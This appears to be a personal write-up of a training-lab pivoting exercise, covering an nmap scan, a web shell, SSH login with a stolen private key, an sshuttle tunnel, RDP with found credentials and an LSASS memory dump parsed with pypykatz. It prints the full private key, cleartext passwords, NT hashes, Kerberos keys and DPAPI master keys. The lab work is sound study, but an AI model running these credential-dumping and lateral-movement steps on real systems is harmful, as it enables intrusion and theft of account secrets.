---
created: 2026-09-09
updated: 2026-09-20
---
## Host `01`

- Foothold: `10.129.229.129`
- Port scanning:

```bash
sudo nmap -sV 10.129.229.129 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 13:25 EDT
Nmap scan report for 10.129.229.129
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
```

- First, get access to the web shell and search the server for any useful information. 
- List `/home/webadmin`:

```bash
www-data@inlanefreight.local:\u2026/www/html# ls -la /home/webadmin
```

```bash
total 40
drwxr-xr-x 4 webadmin webadmin 4096 Feb 21  2024 .
drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
-rw------- 1 webadmin webadmin 1372 Feb 21  2024 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4096 Feb 21  2024 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4096 Feb 21  2024 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
```

- It turns out, a private SSH key is resting there world-readable:

```bash
www-data@inlanefreight.local:\u2026/www/html# cat /home/webadmin/id_rsa
```

- Copy it to your machine and connect via SSH:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvm9BTps6LPw35+tXeFAw/WIB/ksNIvt5iN7WURdfFlcp+T3fBKZD
HaOQ1hl1+w/MnF+sO/K4DG6xdX+prGbTr/WLOoELCu+JneUZ3X8ajU/TWB3crYcniFUTgS
PupztxZpZT5UFjrOD10BSGm1HeI5m2aqcZaxvn4GtXtJTNNsgJXgftFgPQzaOP0iLU42Bn
IL/+PYNFsP4he27+1AOTNk+8UXDyNftayM/YBlTchv+QMGd9ojr0AwSJ9+eDGrF9jWWLTC
o9NgqVZO4izemWTqvTcA4pM8OYhtlrE0KqlnX4lDG93vU9CvwH+T7nG85HpH5QQ4vNl+vY
noRgGp6XIhviY+0WGkJ0alWKFSNHlB2cd8vgwmesCVUyLWAQscbcdB6074aFGgvzPs0dWl
qLyTTFACSttxC5KOP2x19f53Ut52OCG5pPZbZkQxyfG9OIx3AWUz6rGoNk/NBoPDycw6+Y
V8c1NVAJakIDRdWQ7eSYCiVDGpzk9sCvjWGVR1UrAAAFmDuKbOc7imznAAAAB3NzaC1yc2
EAAAGBAL5vQU6bOiz8N+frV3hQMP1iAf5LDSL7eYje1lEXXxZXKfk93wSmQx2jkNYZdfsP
zJxfrDvyuAxusXV/qaxm06/1izqBCwrviZ3lGd1/Go1P01gd3K2HJ4hVE4Ej7qc7cWaWU+
VBY6zg9dAUhptR3iOZtmqnGWsb5+BrV7SUzTbICV4H7RYD0M2jj9Ii1ONgZyC//j2DRbD+
IXtu/tQDkzZPvFFw8jX7WsjP2AZU3Ib/kDBnfaI69AMEiffngxqxfY1li0wqPTYKlWTuIs
3plk6r03AOKTPDmIbZaxNCqpZ1+JQxvd71PQr8B/k+5xvOR6R+UEOLzZfr2J6EYBqelyIb
4mPtFhpCdGpVihUjR5QdnHfL4MJnrAlVMi1gELHG3HQetO+GhRoL8z7NHVpai8k0xQAkrb
cQuSjj9sdfX+d1LedjghuaT2W2ZEMcnxvTiMdwFlM+qxqDZPzQaDw8nMOvmFfHNTVQCWpC
A0XVkO3kmAolQxqc5PbAr41hlUdVKwAAAAMBAAEAAAGAJ8GuTqzVfmLBgSd+wV1sfNmjNO
WSPoVloA91isRoU4+q8Z/bGWtkg6GMMUZrfRiVTOgkWveXOPE7Fx6p25Y0B34prPMXzRap
Ek+sELPiZTIPG0xQr+GRfULVqZZI0pz0Vch4h1oZZxQn/WLrny1+RMxoauerxNK0nAOM8e
RG23Lzka/x7TCqvOOyuNoQu896eDnc6BapzAOiFdTcWoLMjwAifpYn2uE42Mebf+bji0N7
ZL+WWPIZ0y91Zk3s7vuysDo1JmxWWRS1ULNusSSnWO+1msn2cMw5qufgrZlG6bblx32mpU
XC1ylwQmgQjUaFJP1VOt+JrZKFAnKZS1cjwemtjhup+vJpruYKqOfQInTYt9ZZ2SLmgIUI
NMpXVqIhQdqwSl5RudhwpC+2yroKeyeA5O+g2VhmX4VRxDcPSRmUqgOoLgdvyE6rjJO5AP
jS0A/I3JTqbr15vm7Byufy691WWHI1GA6jA9/5NrBqyAFyaElT9o+BFALEXX9m1aaRAAAA
wQDL9Mm9zcfW8Pf+Pjv0hhnF/k93JPpicnB9bOpwNmO1qq3cgTJ8FBg/9zl5b5EOWSyTWH
4aEQNg3ON5/NwQzdwZs5yWBzs+gyOgBdNl6BlG8c04k1suXx71CeN15BBe72OPctsYxDIr
0syP7MwiAgrz0XP3jCEwq6XoBrE0UVYjIQYA7+oGgioY2KnapVYDitE99nv1JkXhg0jt/m
MTrEmSgWmr4yyXLRSuYGLy0DMGcaCA6Rpj2xuRsdrgSv5N0ygAAADBAOVVBtbzCNfnOl6Q
NpX2vxJ+BFG9tSSdDQUJngPCP2wluO/3ThPwtJVF+7unQC8za4eVD0n40AgVfMdamj/Lkc
mkEyRejQXQg1Kui/hKD9T8iFw7kJ2LuPcTyvjMyAo4lkUrmHwXKMO0qRaCo/6lBzShVlTK
u+GTYMG4SNLucNsflcotlVGW44oYr/6Em5lQ3o1OhhoI90W4h3HK8FLqldDRbRxzuYtR13
DAK7kgvoiXzQwAcdGhXnPMSeWZTlOuTQAAAMEA1JRKN+Q6ERFPn1TqX8b5QkJEuYJQKGXH
SQ1Kzm02O5sQQjtxy+iAlYOdU41+L0UVAK+7o3P+xqfx/pzZPX8Z+4YTu8Xq41c/nY0kht
rFHqXT6siZzIfVOEjMi8HL1ffhJVVW9VA5a4S1zp9dbwC/8iE4n+P/EBsLZCUud//bBlSp
v0bfjDzd4sFLbVv/YWVLDD3DCPC3PjXYHmCpA76qLzlJP26fSMbw7TbnZ2dxum3wyxse5j
MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY=
-----END OPENSSH PRIVATE KEY-----
```

- Connect via SSH as `webadmin`:

```bash
ssh webadmin@10.129.229.129 -i id_rsa_webadmin
```

- Enumerate the `webadmin` home directory:

```bash
webadmin@inlanefreight:~$ ls -la
```

```bash
total 40
drwxr-xr-x 4 webadmin webadmin 4096 Feb 21  2024 .
drwxr-xr-x 4 root     root     4096 Feb 21  2024 ..
-rw------- 1 webadmin webadmin 1372 Feb 21  2024 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 May  6  2022 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 May  6  2022 .bashrc
drwx------ 2 webadmin webadmin 4096 Feb 21  2024 .cache
-rw-r--r-- 1 webadmin webadmin  807 May  6  2022 .profile
drwx--x--x 2 webadmin webadmin 4096 Feb 21  2024 .ssh
-rw-r--r-- 1 root     root      163 May 16  2022 for-admin-eyes-only
-rw-r--r-- 1 root     root     2622 May 16  2022 id_rsa
```

- Find credentials:

```bash
webadmin@inlanefreight:~$ cat for-admin-eyes-only
```

```bash
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of : 
Plain Human work!
```

### Creating a pivot 

- Create a pivot using `sshuttle`:

```bash
webadmin@inlanefreight:~$ ip a
```

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:05:17:a6 brd ff:ff:ff:ff:ff:ff
    inet 10.129.229.129/16 brd 10.129.255.255 scope global dynamic ens160
       valid_lft 3287sec preferred_lft 3287sec
    inet6 dead:beef::a0de:adff:fe05:17a6/64 scope global dynamic mngtmpaddr 
       valid_lft 86392sec preferred_lft 14392sec
    inet6 fe80::a0de:adff:fe05:17a6/64 scope link 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:28:7e:05 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::a0de:adff:fe28:7e05/64 scope link 
       valid_lft forever preferred_lft forever
```

- Use `sshuttle` to establish a tunnel:

```bash
sudo sshuttle -e "ssh -i id_rsa_webadmin" -r webadmin@10.129.229.129 172.16.0.0/16
```

```bash
c : Connected to server.
```

## Host `02`

- The address of the pivot's internal interface is `172.16.5.15`; the next target is reachable from that interface. 
- From `webadmin`, perform a ping sweep:

```bash
webadmin@inlanefreight:~$ for i in {1..254} ; do (ping -c 1 172.16.5.$i | grep "bytes from" &) ; done
```

```bash
64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=8.04 ms
```

- Two addresses are found: the pivot itself and `server01` at `172.16.5.35`.
- Use the discovered credentials to connect via RDP:

```bash
xfreerdp3 /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /drive:share,/home/user/HTB/Academy/Pivoting /dynamic-resolution +clipboard
```

- Find the flag:

```powershell
PS C:\Users\mlefay> ls C:\
```

```powershell
    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2022  10:20 AM                PerfLogs
d-r---         5/6/2022   2:30 AM                Program Files
d-----         5/6/2022   2:28 AM                Program Files (x86)
d-r---        5/17/2022  11:14 AM                Users
d-----        5/17/2022  11:10 AM                Windows
-a----        5/17/2022   8:41 AM             21 Flag.txt

```

```powershell
PS C:\Users\mlefay> cat C:\Flag.txt
```

```powershell
S1ngl3-Piv07-3@sy-Day
```

- Inspect groups of the `mfley` user:

```powershell
PS C:\Users\mlefay> whoami /groups
```

```bash
GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                  
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only    
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only    
BUILTIN\Remote Desktop Users                                  Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
- [ ] LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192 
```

- If turns out the user is a member of the `Admnistrators` group, which means they same `SeDebugPrilvege` and can read LSASS memory. 
- Find LSASS process ID:

```powershell
PS C:\Users\mlefay> Get-Process lsass | Select-Object -Property Id, ProcessName
```
```powershell
 Id ProcessName
 -- -----------
664 lsass
```

![[task_manager_minidump.png]]


```bash
wmic service get name,displayname,startname,pathname | findstr /v /i "LocalSystem NetworkService LocalService"
```
```

C:\Users\mlefay>wmic service get name,displayname,startname,pathname | findstr /v /i "LocalSystem NetworkService LocalService"
DisplayName                                                                         Name                                      PathName                                                                           StartName
LSM                                                                                 LSM                                      
NetSetupSvc                                                                         NetSetupSvc                              
Clipboard User Service_1d91d2                                                       cbdhsvc_1d91d2                            C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
Connected Devices Platform User Service_1d91d2                                      CDPUserSvc_1d91d2                         C:\Windows\system32\svchost.exe -k UnistackSvcGroup
ConsentUX_1d91d2                                                                    ConsentUxUserSvc_1d91d2                   C:\Windows\system32\svchost.exe -k DevicesFlow
DevicePicker_1d91d2                                                                 DevicePickerUserSvc_1d91d2                C:\Windows\system32\svchost.exe -k DevicesFlow
DevicesFlow_1d91d2                                                                  DevicesFlowUserSvc_1d91d2                 C:\Windows\system32\svchost.exe -k DevicesFlow
Contact Data_1d91d2                                                                 PimIndexMaintenanceSvc_1d91d2             C:\Windows\system32\svchost.exe -k UnistackSvcGroup
PrintWorkflow_1d91d2                                                                PrintWorkflowUserSvc_1d91d2               C:\Windows\system32\svchost.exe -k PrintWorkflow
User Data Storage_1d91d2                                                            UnistoreSvc_1d91d2                        C:\Windows\System32\svchost.exe -k UnistackSvcGroup
User Data Access_1d91d2                                                             UserDataSvc_1d91d2                        C:\Windows\system32\svchost.exe -k UnistackSvcGroup
Windows Push Notifications User Service_1d91d2                                      WpnUserService_1d91d2                     C:\Windows\system32\svchost.exe -k UnistackSvcGroup


C:\Users\mlefay>

```

- Then copy the file to your local machine using:

```bash
copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\share
```

- Then use `pypykatz` to extract hashes:

```bash
pypykatz lsa minidump lsass.DMP
```

> [!note]- Output (large)
> ```bash
> INFO:pypykatz:Parsing file lsass.DMP
> FILE: ======== lsass.DMP =======
> == LogonSession ==
> authentication_id 2380578 (245322)
> session_id 0
> username mlefay
> domainname PIVOT-SRV01
> logon_server PIVOT-SRV01
> logon_time 2026-09-10T10:04:33.214773+00:00
> sid S-1-5-21-1602415334-2376822715-119304339-1003
> luid 2380578
> 
> == LogonSession ==
> authentication_id 1930025 (1d7329)
> session_id 2
> username mlefay
> domainname PIVOT-SRV01
> logon_server PIVOT-SRV01
> logon_time 2026-09-10T09:44:35.493927+00:00
> sid S-1-5-21-1602415334-2376822715-119304339-1003
> luid 1930025
> 	== MSV ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 		LM: NA
> 		NT: 2831bf1e4e0841d882328d5481fb5c92
> 		SHA1: ccb38ae19c47a04fa01542f30466d6c48ddc18d7
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d7329]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: mlefay
> 		Domain: PIVOT-SRV01
> 	== WDIGEST [1d7329]==
> 		username mlefay
> 		domainname PIVOT-SRV01
> 		password None
> 		password (hex)
> 	== DPAPI [1d7329]==
> 		luid 1930025
> 		key_guid c1afa94a-cfe7-44f9-8221-84844b1177fa
> 		masterkey f7d44d8c674ddb5167664854edc2897e2f14a7a5ac8686889f516134c518be52b1131b6d0d23e3d8fa595aae4d956db9e2a8b9578b735abe2e2d9f1c737f63a5
> 		sha1_masterkey 4d2ec20d809ffb312df4eba4d8fa4e13ede156b6
> 
> == LogonSession ==
> authentication_id 1907824 (1d1c70)
> session_id 2
> username UMFD-2
> domainname Font Driver Host
> logon_server 
> logon_time 2026-09-10T09:44:33.650082+00:00
> sid S-1-5-96-0-2
> luid 1907824
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d1c70]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1d1c70]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 43101 (a85d)
> session_id 0
> username 
> domainname 
> logon_server 
> logon_time 2026-09-10T08:49:57.728312+00:00
> sid None
> luid 43101
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 
> == LogonSession ==
> authentication_id 1908901 (1d20a5)
> session_id 2
> username DWM-2
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T09:44:33.696924+00:00
> sid S-1-5-90-0-2
> luid 1908901
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1d20a5]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1d20a5]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 74012 (1211c)
> session_id 1
> username DWM-1
> domainname Window Manager
> logon_server 
> logon_time 2026-09-10T08:49:58.884433+00:00
> sid S-1-5-90-0-1
> luid 74012
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [1211c]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: 88beffa16e28f0feea07bff7c6e416a629e5e1c5c3deb1ebfac4a540f9282eed
> 	== WDIGEST [1211c]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 
> == LogonSession ==
> authentication_id 999 (3e7)
> session_id 0
> username PIVOT-SRV01$
> domainname INLANEFREIGHT
> logon_server 
> logon_time 2026-09-10T08:49:57.540704+00:00
> sid S-1-5-18
> luid 999
> 	== WDIGEST [3e7]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: pivot-srv01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: fca24755cf2d5cc1fb8243fce649b50d03e3c2a6ea207d73578166cb3a65dc9a
> 	== WDIGEST [3e7]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid 6f898230-c272-4f85-875c-9f7b354ce485
> 		masterkey 515312a4b821ede8f2d839db59ca683d55f8a3a22568d80639e2dd4f6986a4b5dc8ec78bdd54aa643c3856fbb2602301c05f37c763bce3dca8addd70b9709018
> 		sha1_masterkey a72bb2f3d888269936f60a4deb2ea5fc9382ddfc
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6
> 		masterkey eca925284a52906e2fd6cc17fc32eb00147ee9658930c82de6903034e2ba338fa259e096ced51569555490d1dc5903f1b2e9bbd87996b5e95c81b5c1bad0c28c
> 		sha1_masterkey 785e6d5a1dc4a77a4b963b4198b2b5754000a6ef
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid ea556f9f-b1ec-4d0e-934e-56f7b1a4521e
> 		masterkey 3dc6e360071199eb6016523b2a1de43ab2d413d2bedae3518fb97b4f1d300a9bbb9fcde111169ba57d2ae87be2ee108a60ec7aaa34f9d1af06dff18abc6aaf99
> 		sha1_masterkey 22310fb283beb13eadea78129b5b911380a6d522
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid b3862c68-c7e9-4bc0-8b69-6b6433fc3bd1
> 		masterkey 9566cb007639238cfefff46df2e3991d7024311316b3fa0555de19aca824c9e73ab8f3a5d948c419e7424be810ca0a4afd0d70fac9cc470878b3a37931c4bdb7
> 		sha1_masterkey d49aa73fffee65939ecd4b116f96a5294be4c2f2
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid 3c982846-6a2a-4010-b51b-669ec5db81f0
> 		masterkey 9c63585287dc316023e3faacf5e5ab60a173e438bca700ae1fef4960eee9c6177293d75539db21318ae10ea607564e505bad97170b3da360273e238e54abaab4
> 		sha1_masterkey 0217906e3c34978813634d6b50dfbf318f047e3e
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid e515d917-4aa5-4953-a6ca-428d211c999c
> 		masterkey ae42b1ffb36e3b9a896bc9a1fd85eafc14ac34104c14cc8fb38311cb4276429707075234ec35888d241e8c77019d67955662af1cf91777c44e7a47e211477c9d
> 		sha1_masterkey e4fdff41feae03471f1850c0ab485246aa632417
> 	== DPAPI [3e7]==
> 		luid 999
> 		key_guid 9ccbb5e8-66c9-4210-a46c-a72e8f750734
> 		masterkey cb6dd3fe4b3f3a6afa0520d84b39539205139ebd81b68c49aef5c365d975920331c43fb06990aa3ef8c07860fdda33100d3b4cdf259d02cc02a3114ecf6e7721
> 		sha1_masterkey a0c3d07ffb66b9d1d3a9e02237d56fde0fc217d1
> 
> == LogonSession ==
> authentication_id 162969 (27c99)
> session_id 0
> username vfrank
> domainname INLANEFREIGHT
> logon_server ACADEMY-PIVOT-D
> logon_time 2026-09-10T08:50:25.446935+00:00
> sid S-1-5-21-3858284412-1730064152-742000644-1103
> luid 162969
> 	== MSV ==
> 		Username: vfrank
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 2e16a00be74fa0bf862b4256d0347e83
> 		SHA1: b055c7614a5520ea0fc1184ac02c88096e447e0b
> 		DPAPI: 97ead6d940822b2c57b18885ffcc5fb400000000
> 	== WDIGEST [27c99]==
> 		username vfrank
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: vfrank
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: Imply wet Unmasked!
> 		password (hex)49006d0070006c0079002000770065007400200055006e006d00610073006b006500640021000000
> 		AES128 Key: 2e16a00be74fa0bf862b4256d0347e83
> 		AES256 Key: 0f09825ef5dccf80429d92f8d8c3d4eae29b3f01d95e805e97fe1ca5b81c87e8
> 	== WDIGEST [27c99]==
> 		username vfrank
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== DPAPI [27c99]==
> 		luid 162969
> 		key_guid 560f4286-76f2-4f0f-90a9-5135bbc0104f
> 		masterkey 4fc3adb204f30f6a226f637b66be93811cee121eaed0e4ec2e8bc023d2d38d396e0c4e827aa49c6b1c2a58f6428ca725be027497ad10f8dd386d5926e7bf73b7
> 		sha1_masterkey a3e3a61d9a74541a56c3a822d5470bedbb2d4fb5
> 
> == LogonSession ==
> authentication_id 996 (3e4)
> session_id 0
> username PIVOT-SRV01$
> domainname INLANEFREIGHT
> logon_server 
> logon_time 2026-09-10T08:49:58.493791+00:00
> sid S-1-5-20
> luid 996
> 	== MSV ==
> 		Username: PIVOT-SRV01$
> 		Domain: INLANEFREIGHT
> 		LM: NA
> 		NT: 21ce18b1a025d4b0b01c0e716e99d476
> 		SHA1: 0f6097d8c745b1addfdfbbe733c1948e5d929527
> 		DPAPI: 0000000000000000000000000000000000000000
> 	== WDIGEST [3e4]==
> 		username PIVOT-SRV01$
> 		domainname INLANEFREIGHT
> 		password None
> 		password (hex)
> 	== Kerberos ==
> 		Username: pivot-srv01$
> 		Domain: INLANEFREIGHT.LOCAL
> 		Password: 7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		password (hex)7a00340050004e002400510063003f00680031006e0027006d004900600072003c0064007a004a003a002d0053003f00640062006d002e00740041003a0041004e0050006e00470047005d003100680038002c00470062005b00230047007800600053004a006a00330044004f0042004300770068004a0057005e004c004d0055004b006b0050005100620021002800500039005c003c002400560044004c0057004c002b0055004c0034004b0044005a0026006c0068005e005a005f005b004f0045006a003b004900730034003d002000310047004f0052002b00330068003c0055002f0061005b00510037002300
> 		AES128 Key: 21ce18b1a025d4b0b01c0e716e99d476
> 		AES256 Key: fca24755cf2d5cc1fb8243fce649b50d03e3c2a6ea207d73578166cb3a65dc9a
> 	== WDIGEST [3e4]==
